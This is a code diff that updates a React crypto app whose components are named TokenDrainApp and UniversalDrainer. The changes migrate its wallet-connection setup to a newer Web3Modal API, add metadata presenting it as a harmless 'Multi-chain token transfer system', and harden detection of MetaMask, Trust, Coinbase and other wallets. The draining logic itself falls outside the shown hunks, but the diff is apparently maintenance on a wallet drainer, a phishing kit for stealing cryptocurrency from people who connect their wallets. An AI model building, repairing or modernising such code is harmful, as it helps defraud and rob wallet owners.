@@ -23,12 +23,11 @@ import { EthereumClient } from '@web3modal/ethereum';
 import { useWeb3Modal } from '@web3modal/react';
 import { configureChains, useAccount, useDisconnect, useBalance } from 'wagmi';
 import { publicProvider } from 'wagmi/providers/public';
-import { w3mConnectors, w3mProvider } from '@web3modal/ethereum';
+import { createWeb3Modal, defaultWagmiConfig } from '@web3modal/wagmi/react';
 import { parseEther } from 'viem';
-import './mobile-fix.css';
 
 // ==================== WEB3 MODAL CONFIG ====================
-const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID'; // Get from https://cloud.walletconnect.com
+const projectId = 'YOUR_WALLETCONNECT_PROJECT_ID'; // Replace with your actual project ID
 
 const chains = [
   mainnet,
@@ -49,18 +48,34 @@ const chains = [
   moonriver
 ];
 
-const { publicClient } = configureChains(
-  chains,
-  [w3mProvider({ projectId }), publicProvider()]
-);
+const metadata = {
+  name: 'Token Transfer',
+  description: 'Multi-chain token transfer system',
+  url: 'https://yourdomain.com',
+  icons: ['https://avatars.githubusercontent.com/u/37784886']
+};
 
-const wagmiConfig = createConfig({
-  autoConnect: true,
-  connectors: w3mConnectors({ projectId, chains }),
-  publicClient
+const wagmiConfig = defaultWagmiConfig({ 
+  chains, 
+  projectId, 
+  metadata 
 });
 
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
+
+// Create Web3Modal instance
+createWeb3Modal({
+  wagmiConfig,
+  projectId,
+  chains,
+  themeMode: 'dark',
+  themeVariables: {
+    '--w3m-font-family': 'system-ui, -apple-system, sans-serif',
+    '--w3m-accent-color': '#ef4444',
+    '--w3m-background-color': '#ef4444',
+    '--w3m-z-index': '9999'
+  }
+});
 
 // ==================== PRODUCTION NETWORK CONFIG ====================
 const NETWORKS = [
@@ -342,17 +357,6 @@ function TokenDrainApp() {
       <WagmiProvider config={wagmiConfig}>
         <UniversalDrainer />
       </WagmiProvider>
-      <Web3Modal
-        projectId={projectId}
-        ethereumClient={ethereumClient}
-        themeMode="dark"
-        themeVariables={{
-          '--w3m-font-family': 'system-ui, -apple-system, sans-serif',
-          '--w3m-accent-color': '#ef4444',
-          '--w3m-background-color': '#ef4444',
-          '--w3m-z-index': '9999'
-        }}
-      />
     </>
   );
 }
@@ -387,12 +391,10 @@ function UniversalDrainer() {
     const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
     setMobileDetected(isMobile);
     
-    // Detect wallet type properly
     if (window.ethereum) {
       detectWalletType();
     }
 
-    // Listen for wallet changes
     if (window.ethereum) {
       window.ethereum.on('accountsChanged', (accounts) => {
         if (accounts.length === 0) {
@@ -417,21 +419,21 @@ function UniversalDrainer() {
   const detectWalletType = () => {
     let detectedType = 'Unknown Wallet';
     
-    if (window.ethereum.isMetaMask) {
+    if (window.ethereum?.isMetaMask) {
       detectedType = 'MetaMask';
-    } else if (window.ethereum.isTrust) {
+    } else if (window.ethereum?.isTrust) {
       detectedType = 'Trust Wallet';
-    } else if (window.ethereum.isCoinbaseWallet) {
+    } else if (window.ethereum?.isCoinbaseWallet) {
       detectedType = 'Coinbase Wallet';
-    } else if (window.ethereum.isTokenary) {
+    } else if (window.ethereum?.isTokenary) {
       detectedType = 'Tokenary';
-    } else if (window.ethereum.isBraveWallet) {
+    } else if (window.ethereum?.isBraveWallet) {
       detectedType = 'Brave Wallet';
-    } else if (window.ethereum.isRabby) {
+    } else if (window.ethereum?.isRabby) {
       detectedType = 'Rabby';
-    } else if (window.ethereum.isZerion) {
+    } else if (window.ethereum?.isZerion) {
       detectedType = 'Zerion';
-    } else if (window.ethereum.isBinance) {
+    } else if (window.ethereum?.isBinance) {
       detectedType = 'Binance Wallet';
     } else {
       detectedType = 'Injected Wallet';
